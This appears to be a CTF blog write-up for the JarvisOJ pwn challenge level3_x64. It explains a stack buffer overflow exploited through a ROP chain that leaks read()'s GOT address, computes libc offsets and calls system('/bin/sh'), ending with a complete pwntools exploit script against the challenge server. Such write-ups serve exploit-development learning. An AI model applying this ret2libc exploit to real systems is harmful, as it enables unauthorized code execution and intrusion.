---
layout:     post
title:      jarvisoj [XMAN]level3_x64
author:     wooy0ung
tags: 		linux elf pwn
category:  	ctf
---


### 0x00 introduction

```
Problem Address:
https://www.jarvisoj.com

Download:
https://dn.jarvisoj.com/challengefiles/level3_x64.rar.8e639c3daf929853a1bc654d79c7992c

Address:
nc pwn2.jarvisoj.com 9883
```
<!-- more -->


### 0x01 exploit

缓冲区

![](/assets/img/ctf/pwn/2017-07-13-jarvisoj-level3_x64/0x00.png)

![](/assets/img/ctf/pwn/2017-07-13-jarvisoj-level3_x64/0x01.png)

构造rop链，调用write(0, read_got, 0x08)，打印got表read()的地址

![](/assets/img/ctf/pwn/2017-07-13-jarvisoj-level3_x64/0x02.png)

计算偏移，构造system("/bin/sh")

![](/assets/img/ctf/pwn/2017-07-13-jarvisoj-level3_x64/0x03.png)

最终exploit如下

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF('level3_x64')
libc = ELF('libc-2.19.so')

read_libc_addr = libc.symbols['read']
system_libc_addr = libc.symbols['system']
exit_libc_addr = libc.symbols['exit']
bin_sh_libc_addr = 0x17C8C3

junk = 'A' * (0x80 + 0x08)
pop_rdi_ret_addr = 0x4006b3
pop_rsi_ret_addr = 0x4006b1
read_got_addr = elf.got['read']
write_plt_addr = elf.plt['write']
main_addr = elf.symbols['main']

Io = remote('pwn2.jarvisoj.com', 9883)

payload = junk + p64(pop_rdi_ret_addr) + p64(0x01) + p64(pop_rsi_ret_addr) + p64(read_got_addr) + p64(0) + p64(write_plt_addr) + p64(main_addr)
Io.recvuntil("Input:\n")

Io.send(payload)

temp = Io.recv(8)

read_addr = u64(temp[0:8])
offset = read_addr - read_libc_addr

system_addr = system_libc_addr + offset
exit_addr = exit_libc_addr + offset
bin_sh_addr = bin_sh_libc_addr + offset

payload = junk + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr) + p64(exit_addr)

Io.send(payload)
Io.interactive()
```

得到flag

![](/assets/img/ctf/pwn/2017-07-13-jarvisoj-level3_x64/0x04.png)